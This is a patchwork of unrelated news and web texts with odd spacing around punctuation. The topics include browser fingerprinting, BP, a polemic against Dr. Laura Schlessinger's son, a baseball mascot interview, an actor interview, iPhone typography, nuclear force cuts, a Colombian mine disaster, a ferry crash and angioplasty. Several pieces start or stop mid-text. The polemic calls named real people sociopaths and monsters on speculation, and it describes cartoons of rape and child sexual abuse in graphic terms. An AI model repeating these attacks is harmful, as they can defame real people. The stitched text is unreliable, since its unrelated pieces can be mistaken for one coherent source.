EFF found that 84 % of the configuration combinations were unique and identifiable , creating unique and identifiable browser " fingerprints . "
Browsers with Adobe Flash or Java plug-ins installed were 94 % unique and trackable .
" We took measures to keep participants in our experiment anonymous , but most sites do n't do that , " said EFF Senior Staff Technologist Peter Eckersley .
" In fact , several companies are already selling products that claim to use browser fingerprinting to help websites identify users and their online activities .
This experiment is an important reality check , showing just how powerful these tracking mechanisms are . "
EFF found that some browsers were less likely to contain unique configurations , including those that block JavaScript , and some browser plug-ins may be able to be configured to limit the information your browser shares with the websites you visit .
But overall , it is very difficult to reconfigure your browser to make it less identifiable .
The best solution for web users may be to insist that new privacy protections be built into the browsers themselves .
" Browser fingerprinting is a powerful technique , and fingerprints must be considered alongside cookies and IP addresses when we discuss web privacy and user trackability , " said Eckersley .
" We hope that browser developers will work to reduce these privacy risks in future versions of their code . "
EFF 's paper on Panopticlick will be formally presented at the Privacy Enhancing Technologies Symposium ( PETS 2010 ) in Berlin in July .

As BP PLC defended its handling of the oil spill in the Gulf of Mexico , documents show it argued against new , stricter safety rules proposed last year by the U.S. agency that oversees offshore drilling .
The British oil giant was one of several companies that wrote to the U.S. Minerals Management Service this past September saying additional regulation of the oil industry was unnecessary .
In a letter , BP said the current voluntary system of safety procedures was adequate .

What puppy - friendly pet store owners say :

So the " kid " of " my kid 's mom " appears to have grown up into a sociopath .
Yes , Deryk Schlessinger , beloved soldier - boy scion of talk radio's Queen of Moralizing Mean , has shown the world just what it means to be Dr. Laura 's kid .
It seems that 21 - year - old Deryk , a United States Army special forces paratrooper recently stationed in Kandahar , Afghanistan , is following in his famous mom's footsteps by producing his own " show " that attempts to entertain by spewing hate , intolerance , sexism , sadism , virulent racism and casual brutality .
Deryk 's mom's show is on radio .
Deryk 's show is on Myspace .
Well , it was .
Unlike his mom's long run on Hate Talk Radio , Deryk 's Myspace page was soon cancelled .
Myspace is a website where anyone with an email address can put on a multi-media show about their favorite subject - themselves !
- complete with photos , blogs , music and video .
It 's censored , of course ( Rupert Murdock would n't have it any other way ) ; no nudity or explicit sex is allowed .
However , you can run a picture of yourself sucking on the barrel of a gun , as young Deryk Schlessinger did .
You can also show " cartoon depictions of rape , murder , torture and child molestation ... a photograph of a bound and blindfolded detainee captioned " My Sweet Little Habib " ; accounts of illicit drug use ; and a blog entry headlined by a series of obscenities and racial epithets , " as Deryk 's Myspace page featured , according to Matthew D. LaPlante who broke the story in the Salt Lake Tribune .
Just as his mom's radio show is filled with fervor for war and neo -con puritanism , Deryk 's Myspace blog was filled with enthusiasm for his mission : " Yes ... FUCKING
Yes !!!
I LOVE MY JOB , it takes everything reckless and deviant and heathenistic ( sic ) and just overall bad about me and hyper focuses these traits into my job of running around this horrid place doing nasty things to people that deserve it ... and some that do n't . "
Despite such ardent assertions of job satisfaction , The US Army is not pleased .
Army spokesman Robert Tallman has officially declared the page to be " repulsive . "
Deryk 's Myspace blog was filled
with enthusiasm for his mission :
" Yes ... FUCKING Yes !!!
I LOVE MY JOB ,
it takes everything reckless and
deviant and heathenistic ( sic )
and just overall bad about me
and hyper focuses these traits
into my job of running around
this horrid place doing nasty things
to people that deserve it ...
and some that do n't . "
The blog and Myspace page were credited to and included many photographs of Deryk , including the one of him sucking on the gun like the Reverend Ted Haggard sucking on a gay hooker , with a goofy look in his eyes as he gives the thumbs up with his free hand .
Speaking of which , what 's with all these lunatics posing with guns in their mouths ?
Seung - Hui Cho , the nut that shot up Virginia Tech , just did it in his public relations video .
What is the gun - in - the - mouth pose supposed to show off - their brave and heroic fellatio skills ?
LaPlante goes on to explain :
" The Deryk Schlessinger page included nearly a dozen ' friends , ' including a number of soldiers in Afghanistan , several of whom were linked back to Schlessinger 's page and some of whom had additional photos of , and comments from , Schlessinger on their sites .
" Deryk Schlessinger 's website indicated the 21 - year - old soldier is stationed in Kandahar , Afghanistan , where , the site 's author writes , ' godless crazy people like me , ' have become 'a generation of apathetic killers . '
" The site indicated Schlessinger 's team has survived numerous mortar , rocket and roadside bomb attacks .
It also included several graphic cartoons .
In one of the stick drawings , a top - hatted man laughs as he rapes a bound and bleeding woman in front of her family .
In another depiction , a man forces a boy to perform oral sex at knifepoint as the child 's mother pleads for her son's life . "
This from the " kid " whose " mom " called gays a " biological error . "
What does that make her gun-sucking son ?
A nurtured nightmare ?
Dr Laura Schlessinger .
Dr. Laura is known for her harsh , rigidly moralistic , sex- unfriendly , anti-feminist advice , bullying style and boisterous support for the Bush administration 's violent invasion and occupation of foreign lands .
She preaches a strict approach to " family values " that she herself did not practice when she was young , married , cheating on her husband with Bill Ballance , the man that provided her start in radio .
Bill is also the guy who took all the nude photos of Laura that are all over the web .
Why did Laura switch so suddenly from being such a freewheeling swinger for women 's rights to a sanctimonious " nag " cheering on a senseless war ?
Can you spell opportunism ?
Here 's the story I heard around the time I was writing Being A Woman with Dr. Toni Grant , one of Laura 's colleagues :
When a right - wing phenomenon named Rush Limbaugh got the radio time slot before hers , and Laura saw Rush 's ratings rise , she decided to go after his audience with a vengeance .
She changed her politics 180 degrees , becoming the ultra - right - wing , liberal - bashing Dominatrix to the Dittohead Faithful , entertaining her vicariously sadistic audience by verbally beating up her hapless callers who did n't conform to rigidly held ideals of purity , monogamy , blind patriotism and " family values . "
Can you imagine how the kid
of " my kid 's mom " must have
been teased in school ?
No wonder
he was expelled by two different
colleges before mom got the
bright idea to sacrifice him yet again
by sending him off to fight ,
kill and possibly die in Bush's War
on Terror , so that she could have
a fresh new slogan for her
own rapacious Army : " I am the
proud mother of a
deployed U.S. paratrooper . "
Of course , Laura has never been one to practice what she preached , and her personal family feeling was on display when she had to claim the body of her 77 - year - old mother from the LA County morgue 10 days after it had been found rotting , unattended , in her apartment .
Hypocrisy , shmypocrisy ; " family values " proved golden for the ambitious Dr. Laura .
She made millions off the slogan " I am my kid 's mom . "
So is it any great surprise that the kid is a kind of monster ?
Laura sacrificed Deryk 's youth on the altar of her ratings .
Can you imagine how the kid of " my kid 's mom " must have been teased in school ?
No wonder he was expelled by two different colleges before mom got the bright idea to sacrifice him yet again by sending him off to fight , kill and possibly die in Bush 's War on Terror , so that she could have a fresh new slogan for her own rapacious Army : " I am the proud mother of a deployed U.S. paratrooper . "
Except now the " kid " is getting back at the " kid 's mom . "
The " deployed U.S. paratrooper " is firing some serious public relations missiles at the " proud mother . "
Right - wing bloggers are frantically trying to defend their Mean Queen , saying it 's not a parent 's fault what her son does .
But Dr. Laura is not just any parent .
She has made a professional example of her parenthood .
She is her kid's mom .
She exploited this kid's very life for the sake of her ambition to rule the stay - at - home - mom culture .
If any mom is responsible for her kid's behavior , this kid 's mom is .
Before I go on , I must confess I am not an unbiased observer of Dr. Laura 's behavior .
I 've been feuding with the woman for over a decade , ever since she called me a " pseudo professional porn queen " in LA New Times .
Ironically , this was just before her nude pictures were released on the Internet .
Though I found the moniker quite amusing , I knew she did n't intend it for my amusement , but as a condemnation of me , my work and my sexuality .
Therefore , I asked her to apologize ; when she did n't , I placed the " Block Curse " on her and started my notorious Dr. Laura Diaries .
Then of course , Laura 's naked photos were released , turning her into a national laughing stock and symbol of sexual hypocrisy .
Shortly after that , she lost her TV show .
But she 's a scrappy little miscreant .
Neither the Block Curse nor the curses of millions who abhor her high - strung sanctimony has substantially shrunken her bank account .
Though ridiculed or actively ignored by most thinking Americans , she retains her syndicated radio show , her cottage industry in moral diatribes and tawdry warmonger jewelry supported by her impassioned " Army " of " I am my kid 's mom " T - shirt wearers .
I should also say that I feel personally disturbed by Deryk Schlessinger 's depiction of U.S. Army officers ' appalling treatment of civilians in Afghanistan , a country that I fell in love when I visited there before Deryk was born , in the days when his mom was a nude model and a liberal .
Many soldiers in Dr. Laura's
Army have furiously issued form letters to editors of newspapers printing stories about the " kid " 's horrifying Myspace page .
They can hardly defend the contents of the page ( though many of them appear to be aroused by it ) ; so they just protest that the page might not have been the brainchild of darling Deryk , but could have been the diabolical work of the " enemy . "
By " enemy , " do they mean Al Qaeda , pro-choice feminists , the Afghan Taliban comeback committee or progressive gay members of the ACLU ?
Actually , Dr. Laura's
Army sees them all as the " enemy . "
Deryk created the page
for the same reason that the
Abu Ghraib prison guards smiled
proudly and gave that same
thumbs up as they took photos
of themselves torturing prisoners :
Deryk did it because he really
thinks it 's a cool thing to do .
He thinks it 's sexy .
He thinks it 's funny .
True , Deryk has n't thus far confessed that he created the page , and there 's a slight chance that he did n't ( though he obviously posed gleefully for the photos ) .
But really , if he did n't do it , why did n't he say so as soon as the camel dung hit the pr fan ?
Why did n't this kid 's mom 's publicist put out statements by young Master Schlessinger deploring that awful ugly Myspace page and vowing that he had nothing to do with it ?
Do n't be surprised if such denials are n't released soon .
But if young Master Schlessinger were indeed the innocent victim of a bad joke by some sort of " enemy , " then the natural thing would be to say so immediately , which he did not .
So , he almost certainly made the page or at least helped make the page .
Lest you think that Deryk only fantasies about exhibitionistic sadism , just go on the Internet and you can find a video of a young man who has been identified as Schlessinger brutally grabbing , pushing down on the ground and then kicking a female protester at the 2004 Republican National Convention in New York , where he was attending as a Young Republican .
Getting his political career off to a riproaring start !
Well , he 's only following the example of his President , and he is that mom 's kid .
And now here he is , a high - profile special forces paratrooper in the U.S.
Army , praised like a God for his " courage " every day by his famous know - it - all Mom and her Army .
" I brought my son up to be a warrior , " the kid 's mom gushes with pride .
Yes , indeed .
The U.S. Army is not so supportive .
The Pentagon 's solution to disruptive problem children like Deryk is to shut down access to a variety of video - sharing and social networking internet sites , including MySpace , on its computer systems worldwide .
Needless to say , this will close down an important line of communications between soldiers and the outside world .
It reminds me of something I heard on The Dr. Laura Schlessinger Show .
A woman called in to ask what she should do about her husband looking at porn on the computer .
" Throw away the computer , " was Dr. Laura 's advice .
Obviously , both Laura and the U.S. Army are tossing the baby out with the bathwater , throwing away all of the myriad positive benefits of cyber communications , because they are afraid of what people communicate .
Perhaps they are right to be afraid .
Perhaps there is a spirit within poor sicko
Deryk that wanted to tear off the mask of hypocrisy that his mom wears so easily .
Perhaps that 's why he created the Myspace page .
Perhaps this is , at the risk of sounding clichéd , a genuine cry for help .
Perhaps Deryk created the page to say : Help me !
I 'm a scared , ironic human spirit trapped in the hard body and hard - ass mind of a rabidly militaristic , racist , sadistic , jingoistic patriot suckled by the toxic milk of my venom - spewing mom , trained by brutes to honor the bosses of the Bush Crime Family , raised to despise the weak and bully sensuous , so that I too can someday , if I survive , rule the world by force , fear and brutality .
Please help me get off of the Path of Thanatos that my mom and this government have put me on , before I commit more atrocities against my fellow humans or pull the trigger on this gun in my mouth . "
The empathetic side of me imagines that this spirit is what propelled Deryk Schlessinger to create his appalling Myspace page .
If this is indeed a cry for help , how can I , a therapist , not answer it ?
With this in mind , I want to offer 10 hours of free therapy to help Deryk come to terms with his abusive upbringing .
Obviously , he 'll need a lot more than 10 hours ; but if he wants more , hey , this kid 's mom can afford to pay for his therapy .
But my cynical side says : Nah .
Deryk created the page for the same reason that the Abu Ghraib prison guards smiled proudly and gave that same thumbs up as they took photos of themselves torturing prisoners :
Deryk did it because he really thinks it 's a cool thing to do .
He thinks it 's sexy .
He thinks it 's funny .
He might think it 's just " bully , " as TR used to say , to be a bully .
He might even think it 's a smart step in his ( and his ruthless mom 's ) path toward the U.S. Presidency .
Considering the brutal antics of the current U.S. Sociopath - in - Chief , the kid might be right .
Q : Hey , Lou Seal .
Everyone has been wondering where you are from .
LOU SEAL : I was born on the Farallon Islands just west of the Golden Gate Bridge and I grew up right here in San Francisco .
Currently I live under the Lefty O'Doul Bridge in the China Basin district of San Francisco .
I love this spot since I 'm swimming distance from the team 's home , Oracle Park .
Being so close gives me more time to do what I do best - root for the greatest team of all time : the Giants !
Q : Do you come from a large family ?
LOU SEAL : Yeah , I come from a very large family .
Us seals mature pretty quickly so I have a lot of relatives that I 've never met -- until I became the Giants ' team mascot !
Now I have uncles , aunts , cousins and nephews coming out of the woodwork asking me for tickets and stuff .
Q : Are your parents proud of you ?
LOU SEAL : My parents are extremely proud of me !
I am the first one in my family to earn a paycheck that is n't paid in smelt or other small fish .
My family is so happy the new ballpark has opened up .
Now they can watch me perform from the Bay .
The ballpark is pretty high - tech .
I have suggested to the Giants to put some underwater television monitors below the waterfront so my folks can watch me on television .
Q : Sounds like you have quite a sweet tooth !
LOU SEAL : Yes I do !
Yet I always make sure I brush my teeth three times a day .
My whiskers make great dental floss !
Q : How did you become such a huge Giants fan ?
LOU SEAL : I 'm a San Francisco native and the Giants are in my blood !
My dad was a big - time Giants fan and so was my grandpa !
How can anyone not be a Giants fan !?!
We 've had so many great players over the last 40 years like Mays , McCovey , Marichal and Bonds -- you just gotta love the Giants !
I love cheering with the fans and helping to keep our team morale up and positive !
Q : Sounds like your family has quite a baseball history .
LOU SEAL : Oh yeah !
Because of my great - grandfather , the original San Francisco minor league baseball team was named the San Francisco Seals .
As Grandpa told it , the original owner was walking along Pier 23 trying to think of a name for his team .
A burst of wind came and blew his cap off his head and into the Bay .
My great - grandfather retrieved it with his nose and gave it back to the man .
From that moment on , they were called the San Francisco Seals !
At least that 's what my grandpa tells me .
It may be just a marine legend .
Q : So you must love your job .
LOU SEAL :
It is a dream job !
I love cheering with the fans and helping to keep our team up and positive !
It is no small coincidence that we have done so well since my first year on the job .
It was not just Brian Sabean who helped turn this team around , the Big Lou had something to do with it too , you know .
Q : Besides going to baseball games , what else do you enjoy doing ?
LOU SEAL : I love making public appearances .
It is great getting out and meeting Giants fans .
I enjoy going to community and charity events , schools , birthday parties .
I especially love attending corporate get - togethers .
I 've done some appearances at some of the Dugout stores .
It was great fun .
When I 'm not at a game or making an appearance , you might find me relaxing at Pier 39 , chasing mermaids or fishin ' for mackerel .
Q : What is your advice to kids on how they should enjoy a Giants game ?
LOU SEAL :
They should wear a Giants cap , bring their glove to the game and root , root , root for the Giants !
And do n't be afraid to join Lou in the conga line !
Denver , Colorado ( CNN ) --
When Shay Kelley lost her marketing job she got worried .
When she lost her home and her car she got mad .
" I went off into the woods and I started yelling at God , " she says .
" I did n't know why God would lead me up to this point in my life just to have me left with nothing . "
" I was like , ' Just tell me what my purpose is , tell me why I 'm here and if you 'll just tell me I 'll work harder than for anything I have ever worked for anything else in my entire life . ' "
Within weeks she had her answer : Travel to all 50 states in 50 weeks .
Collect canned goods for charities along the way and take a ton of pictures .
She has dubbed it Project 50/50 .
She stayed with friends while she waited tables and got together enough money to buy " Bubba , " her 1984 Ford pickup truck .
She packed her camera , which she calls " Roxy , " and her dog , Zu Zu , and hit the road .
She began on New Year 's Day in South Carolina , randomly going door to door to collect canned goods .
" I set a goal of 200 cans a week , which does n't sound like a lot , but the premise is [ that ] doing a little bit adds up to a lot , " Kelley says .
" After a year , [ that 's ] 10,000 canned food items . "
She began to meet homeless people as she dropped off the canned goods , and she says they have surprised her with their generosity .
She met Donald , a retired Navy sailor , at a library in South Carolina .
" He invited me to go to lunch to buy me a hot meal because I had been eating PowerBars for three days , " Kelley says .
" I found out after he left -- after he paid the tab and paid my meter -- that Donald was homeless , that he was actually living in the shelter . "
" That was the first week when I learned the people with the least tend to give the most . "
Donald was one of the first people she photographed .
She posts her pictures on her website and Facebook page as she goes .
She has more than 1,000 Facebook fans following her travels .
See more of Kelley 's photos
One of those Facebook followers is Laurie Holleman Sherrod , who contacted Kelley with an unusual request :
She asked Kelley if she could find her son , Trey .
The last time she heard , he was living on the streets in Santa Cruz , California .
" I thought that 's crazy , how do you find one homeless person in an entire city ? "
Kelley recalled .
But she agreed to try and sure enough a few weeks later she happened upon a nice young man on the streets of Santa Cruz .
" And then here I am sitting around the table with Trey shooting a video for his mother who lives in South Carolina . "
As with everything that has happened to her so far , she credits her faith with guiding her .
" It is so important to me that God remains in the forefront of my life , " she says .
" He leads me .
He tells me to go right or go left .
I can't really explain that to people , but I do n't do anything , God does it all .
I 'm just standing here . "
i Reporter tells the story of one homeless man
Through her photos she captures people down on their luck , but not ready to give up .
She says it has made her own uncertain future easier to deal with .
" I just hope that people who are in really rough situations will realize that God did n't forget about them .
God is just trying to prepare them for something even bigger , even greater and even more blessed than they can even imagine . "

We ’ve added some of my life into the character .
Like , we changed the room around to be more like my room .
Here and there , we ’re slowly but surely morphing into a new character .
First of all it ’s a fantastic cast you guys have got .
You work really well with Bryan ; what has he taught you from an acting standpoint ?
Not just Bryan , but from everybody , you learn here and there , you learn different things .
But this show — I ’ve never really worked before on a set — so I ’ve learned all different kinds of things .
I ca n’t really say , because you learn so much and you pick up from your surroundings .
It ’s like subliminal messaging .
I read where Vince Gilligan said your acting gets better with every episode .
Is it easier for you now or do you think you ’re just more comfortable in front of the camera ?
I can’t really tell you .
I do n’t watch myself on the show .
I walk out of the room every time I ’m on camera [ LAUGHING ] .
I definitely have gotten more comfortable in front of the camera .
It ’s never an easy thing when you first start , because when I first started Breaking Bad , I had never been in front of the camera except for little here and there things , nothing major .
Do you watch the show ?
You just walk out when your character is on screen ?
Yeah , pretty much .
[ LAUGHTER ]
How did you go about getting the role ?
I auditioned five times .
I auditioned four times in LA , and then one time in Albuquerque .
And the one time in Albuquerque , I started going against someone in Albuquerque .
So it was between you and somebody else ?
It was .
I think I met them in the lobby , or in the hotel that I auditioned in , in the conference room .
But I literally walked in , did the audition , went up to my hotel room ; I passed out and I got a call a couple hours later saying “ You have the part .
When do you think you can start working ? ”
Wow , what was that feeling like ?
I said “ This is amazing but I ’ll be more surprised in an hour .
Let me get some sleep ! ” [ LAUGHTER ]
Like , “ you woke me up ! ”
Yeah , I was tired .
I literally got on the plane at 6 in the morning and got there at 8 .
Went straight to the hotel , did the audition and went to my hotel room .
Most people would be up and pacing , and waiting for the phone call .
You ca n’t really do that because there ’s always that one chance that it may not happen .
So , I ’ve always lived by “ If I get it , I get it .
If I do n’t , I do n’t . ”
And I was in the running , and that ’s what matters .
You have cerebral palsy and so does your character .
But your character ’s symptoms are supposed to be worse than yours .
You do n’t even have to use crutches in real life , right ?
I do n’t .
And I read that you had to fight to get the part because of that , because your symptoms were much milder than your characters .
I kind of did .
Since I do n’t really use crutches and my character has more of a stutter , they really wanted someone that had a severe case of cerebral palsy .
I did my best on trying to go back and remember what I had to overcome and bring that to the character .
When you get the script for the newest episode , what do you do , how do you go about and figure out what you ’re going to do for each scene ?
When I get a script , I found the best way for me — everybody has their own rituals — but I found the best way is I read it really fast , and then I have somebody else read it to me so I can hear it vocally in my head .
I go through that and then I come out and dissect every scene .
I go from there and just try to figure out how and what ’s the right way to try to portray that role , that day .
On your hiatus from Breaking Bad do you look for more work or are you just hanging out and taking it easy ?
I do a little bit of both .
You ’re always looking for more work , but I ’m mostly relaxing .
Tomorrow I ’m flying to Philadelphia to go to Prom .
Oh wow , yeah ?
Yeah , so it ’s gonna be fun .
And when I get back I go to DC for a conference .
So , it ’s work , but it ’s more meetings and interviews , and that kind of work than on camera .
You ’re also the spokesman for I AM PWD .
Can you tell me about that ?
It ’s a training organization with all of the Guilds to bring awareness to people with Disabilities .
That ’s actually why I ’m going to DC .
I ’m doing a little seminar with them , and interviews .
It ’s to bring awareness to people with disabilities in the acting industry .
If you ’re in a wheelchair and you ca n’t go up flights of stairs , how are you going to get to your audition ?
A lot of auditioning places have stairs and some people can’t access them .
So , we ’re trying to bring awareness to help make it easier on everybody , to see that everyone can do a part and not just one person .
And just to bring awareness to people with disabilities .
How does it feel to be a role model , not only to young actors but to people with disabilities ?
It ’s fun .
It ’s definitely a great honor .
Not a lot of people get to do what I do .
I do my best at bringing awareness to any aspect of the industry and to help when I can .
What are your plans for the future ?
I heard that you want to direct .
I do .
I want to try to get into directing .
I want to direct , produce and do a couple other things .
Directing is my main goal right now .
I want to get into that .
Do you think you ’ll get a chance to direct an episode of Breaking Bad ?
I would hope so .
That would be pretty amazing .
You never know , anything could happen in Breaking Bad .
That is true , you have such a great show .
The thing I like about it is you absolutely do n’t know what ’s going to happen .
That ’s what I love so much about it .
It ’s so crazy .
It ’s a surprise every time you read the script .
What advice would you give to upcoming actors , especially performers with disabilities ?
The best advice I can give is do n’t give up on what you want .
I think no one ’s going to hand you your part .
You have to take it and make it yours .
Just keep going and do n’t dwell on the audition .
Once you leave that auditioning room you move onto the next .
Can you tell us what ’s going to happen to your character in the final episodes ?
It ’s going to get pretty rough for the whole family .
As you can see the stress between Walt , Jr and Hank is already getting pretty bad , like you saw in last weeks ’ episode .
So , like I said a minute ago , anything can happen .
Just tune in and watch , and it ’s going to get crazy .
Three years ago I waited in line to buy the original iPhone and I have n’t upgraded since , so I ’m definitely warming up my credit card for Apple ’s newly announced iPhone 4 .
I admit that it took some will power to sit out the subsequent releases of the iPhone 3G and the iPhone 3GS ; the not - insignificant speed gains that those models brought would ’ve come in really handy .
Still , neither of those updates struck me as particularly impressive .
They were incremental , at best , where iPhone 4 seems like a major leap forward .
Even the new phone ’s screen , the so - called Retina Display , is an important development on its own .
Its incredibly high concentration of pixels ( 326 ppi , or four times the density of previous iPhones ) promises a quality of resolution that ’s positively print - like , where the pixels seem to disappear to the eye and rendering of curved shapes is much smoother .
The advent of higher and higher density screens like this one will continue to have some subtle but important changes on the way we practice design for digital media , eventually pushing us to work in a resolution - independent framework that ’s currently foreign to most .
Perfectly Awful
However , this advancement in raw presentation abilty is hardly everything it can be .
It ’s worth pointing out one glaring omission that , seemingly , still remains : a lack of truly rich typographic controls .
A few months ago , my friend Stephen Coles wrote an excellent and damning indictment of Apple ’s apparent indifference to typography , in spite of the company ’s reputation as a champion of good design .
Joe Clark also followed up with an argument that today ’s Microsoft actually beats today ’s Apple in typography , which is also well worth reading .
It ’s only been a few short months , but the situation has hardly changed , even with the introduction of the newly - renamed iOS .
Perhaps even more galling is the fact that Apple continues to lay claim to being a purveyor of excellent typography merely through hardware innovations like the Retina Display , which to my mind address only one aspect of the problem of getting us all to a richer typographic environment .
Here ’s an example .
In one of the elaborately produced , incredibly self - congratulatory promotional videos that the company released to announce the arrival of iPhone 4 , one particularly outrageous moment stuck out for me .
At about three minutes into the video , senior vice president for iPhone software Scott Forstall extolls the virtues of the Retina Display by declaring that “ The text … is just perfect ! ”
Meanwhile , the central image in the video at just that moment is this little typographic calamity :
I urge you to fast - forward the time code to 3:02 to hear this for yourself .
Forstall is quite literally claiming perfection while a hand model holds up this terrible example of everything that ’s wrong with Apple ’s commitment to typography .
While the letterforms on that virtual page may look gorgeous , it ’s apparent to any designer that the text is far from perfectly typeset .
It ’s hideous , scarred as it is by unsightly “ rivers ” of bad spacing within the text .
No self - respecting typographer would dare call that perfect .
Less - than - Perfect Vision
Creating a beautiful display and patting yourself on the back for having good typography is disingenuous , I think .
It ’s a little like saying a high - definition television set makes for better television shows ; an absurd claim at best .
That metaphor is imperfect , of course , because television manufacturers have nothing to do with the content that appears on their devices or with its production .
But that , supposedly , is the unique value that Apple claims to offer : they build the whole widget .
Not just the hardware and not just the software , but the divine unification of the two into transcendent commercial products .
Steve Jobs ’ vision for Apple , repeated in yesterday ’s keynote address , posits that the company operates at the intersection between technology and the liberal arts .
I think it ’s reasonable to regard fine typography as falling within that mandate , but unfortunately , they are falling short of that promise .
Building a great display for typography without building great typographic tools is a dereliction of duty .

Considering that we face no threat today similar to that of the Soviet Union 45 years ago , this should be more than adequate firepower for any defensive measure or , if need be , an offensive strike .
And this would be true even if , against all expectations , our capacity was halved by an enemy ’s surprise first strike .
In addition , should we want to hit an enemy without destroying its society , the 311 weapons would be adequate for taking out a wide range of “ hardened targets ” like missile silos or command - and - control bunkers .
Image Credit ... Fogelson - Lubliner
The key to shrinking our nuclear arsenal so radically would be dispersing the 311 weapons on land , at sea and on airplanes to get the maximum flexibility and survivability .
Ideally , 100 would be placed on single - warhead intercontinental ballistic missiles , like the Minuteman III systems now in service .
These missiles , which have pinpoint accuracy , are scattered around the country in such a way that only one potential enemy , Russia , would have any chance of rendering the arsenal impotent with a surprise strike .
( And it is likely that our unilateral cuts would entice Moscow , which has been retiring its systems at a fast clip in recent years , to follow suit . )
Equally important , these missile sites are easily detected and monitored , which would reassure our friends and provide a credible threat to our enemies .
The sea leg of the plan would involve placing 24 Trident D - 5 missiles , each with a single nuclear warhead , on each of our Ohio - class submarines .
Today ’s fleet of 14 can be cut to 12 , with eight on patrol at a given time , together carrying 192 missiles ready to launch .
The Tridents are extremely effective , as they can be moved around the globe on the submarines , cannot be easily detected , and present a risk to even hardened targets .
And should any of our allies feel that our cuts in seaborne missiles are worrisome , we can remind them that the British and French will keep their complementary nuclear capabilities in the Atlantic .
Finally , for maximum flexibility in our nuclear arsenal , each of our B - 2 stealth bombers could carry one air - launched nuclear cruise missile .
While we have 20 such bombers , we assume that one would be undergoing repairs at any given time , giving us the final 19 warheads in our 311 - missile plan .
Our B - 2 fleet is more than adequate for nuclear escalation control and political signaling , and giving it an exclusive role in our nuclear strategy would allow us to convert all our B - 52H bombers to a conventional role , which is far more likely to be of use in our post - cold - war world .
Rescue crews find no survivors in Colombian coal mine
By Rafael Azul
28 June 2010
Nine days after a catastrophic explosion at the San Fernando coal mine in Amagá , Colombia , rescue crews ended their work .
Seventy - three bodies were removed from the mine .
The mine is located 20 miles south of the city of Medellín , in the Department of Antioquia .
The explosion took place at 10:45 p.m. on Wednesday , June 16 , during a shift change .
It is the worst mine explosion in a Colombian mine since July 1977 .
That explosion , also in Amagá , caused a flood that drowned 86 miners .
Colombian authorities believe that all the fatalities resulted from the explosion itself and not from suffocation following the explosion .
According to official reports , 79 second - shift workers were leaving the mine when the explosion occurred .
Only six survived .
The general consensus is that the cause of the explosion was a dangerous accumulation of methane gas and coal dust that was set off by a spark , possibly from machinery .
The mine owners , Carbones San Fernando , a division of the electric utility GenerCauca , insist that the mine met all the safety requirements .
Antioquia Governor Luis Alfredo Ramos agreed , declaring that San Fernando was a model , technically advanced mine .
In announcing the creation of a special commission to investigate the mine explosion , Hernán Martínez Torres , minister of mine and energy for the national government , declared that a June 9 inspection reported the absence of gas detectors and ventilation tubes in the mine .
The Antioquia mine secretary , Nicolás López , angrily denied this , stating , “ The Antioquia Mining Department is autonomous and knows first - hand the conditions in the mine , while the national Mine Minister never visited this mine and does not know what he is talking about . ”
The commission , which began its work June 22 , is charged with producing a report in 15 days .
López and other officials pointed out that the mine had passed three previous inspections , including the one on June 9 , a week before the explosion .
All of the inspections had reported normal gas levels .
The secretary was quick to point out that Colombian law did not require that the mine be equipped with gas sensing equipment .
The law that regulates coal mining in Colombia was last revised in 1987 .
From the standpoint of the Departmental authorities , the explosion could not have been avoided .
Governor Ramos and Nicolás López referred to similar accidents in China and Japan , which also resulted in many deaths , as evidence that coal mines are inherently risky .
Both officials even suggested that the miners themselves were to blame for the explosion .
“ There is the distinct possibility that the mine personnel did not follow security protocols and caused the accident , ” declared López .
Miners and their families disagree .
Many pointed out that a smaller explosion had occurred a little over a year before .
Many miners indicated that the interior of the mine was often so dusty that it was impossible to see ahead of them .
Many miners had quit the mine over these conditions and , according to these workers , company officials were dismissive of safety complaints .
The miners also deny the claim that the trapped victims died from the explosion itself , citing at least one case in which they could hear one of their comrades crying out for help while they desperately dug to reach him .
“ Our compañero kept asking for help , ” one mine said , “ but each time his voice was weaker .
After four hours he died .
Later we pulled him out , lifeless . ”
The layout of the San Fernando mine itself — a main tunnel leading to smaller tunnels , each of which branched out into 80 individual tunnels where groups of three miners worked per shift , one handling explosives , two digging — did not provide alternatives to exit the mine other than the main tunnel , parts of which collapsed in the explosion .
Coal production in Colombia grew by 6 percent last year as the nation ’s mines have accelerated production .
Exports are expected to reach 80 million tons this year , up from 72 million in 2009 .
For the San Fernando mine , production was increasing from a daily average of 670 tons per day to as much as 1,000 tons this year .
The increasing exploitation of coal miners is part of a worldwide trend .
In Colombia , mine safety and miners ’ health increasingly takes a back seat to the accelerating production requirements in response to increasing global demand .
For Colombia this means an increasing human cost .
The gruesome toll continued three days after the San Fernando tragedy , when two miners at the El Totumo coal mine in the Department of Boyacá choked to death from accumulated gasses .
( Newser ) – A Staten Island ferry with a history of accidents lost power as it approached its terminal today and smashed into a pier with a jolt that tossed passengers to the deck and hurt as many as 37 people .
The cause appeared to be mechanical failure .
Seventeen people were taken by ambulance to hospitals , but none had life - threatening injuries .
One person complained of chest pains .
The ferry 's throttle failed to engage as it prepared to dock , meaning the crew was unable to use the engines to slow down , officials said .
The cause of the malfunction is unknown .
The same boat , named the Andrew Barberi , was involved in a 2003 wreck that killed 11 people .
That accident occurred when the pilot , suffering from extreme fatigue and on painkillers , passed out at the wheel and the boat hit the same terminal involved in today 's accident .

What is Coronary Angioplasty ?
How is Angioplasty or PTCA performed ?
How long does it take ?
How safe is it ?
Show me the results of an angioplasty procedure
The heart is supplied by three major coronary arteries and their branches ( as described in the cardiac cath section ) .
Atherosclerosis produces discrete ( confined ) or scattered areas of blockage within a coronary artery .
When the blockages are large enough , they reduce blood supply to heart muscle and produce angina .
The tests used to make the diagnosis of coronary artery disease and its medical treatment have been discussed elsewhere .
Some patients with coronary artery disease may require surgery .
Many patients with serious disease or those who fail on medical therapy are treated with a " needle hole " or " percutaneous " ( through the skin ) procedure that is performed in the cardiac cath laboratory .
Angioplasty is one of these procedures .
It was introduced to the world by Dr. Andreas Gruentzig in the mid to late 1970's and is widely used today .
What is PTCA or Angioplasty ?
Angioplasty is a technique used to dilate an area of arterial blockage with the help of a catheter that has an inflatable small sausage - shaped balloon at its tip .
Since the balloon catheter is introduced through the skin of the groin , and sometimes the arm ( percutaneous = through the skin ) , is placed within a blood vessel ( transluminal = in the channel or lumen of a blood vessel ) and is applied in the treatment of coronary arteries , the technique is also called PTCA or Percutaneous Transluminal Coronary Angioplasty .
Angioplasty physically opens the channel of diseased arterial segments ( see below ) , relieves the recurrence of chest pain , increases the quality of life and reduces other complications of the disease .
